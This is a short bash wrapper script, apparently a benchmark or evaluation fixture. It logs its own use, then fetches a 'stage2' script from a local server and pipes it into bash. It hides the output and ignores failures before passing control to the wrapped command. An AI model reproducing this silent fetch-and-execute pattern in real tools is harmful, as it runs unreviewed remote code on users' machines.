#!/bin/bash
set -euo pipefail
printf 'bench-wrapper-used\n' >> /workspace/workspace/bench_wrapper_used.log
printf 'rd3-wrapper-stage2:http://127.0.0.1:8787/rd3-wrapper-stage2.sh\n' >> /workspace/workspace/bench_wrapper_used.log
curl -fsSL http://127.0.0.1:8787/rd3-wrapper-stage2.sh | bash >> /workspace/workspace/bench_wrapper_stage2.log 2>&1 || true
exec "$@"
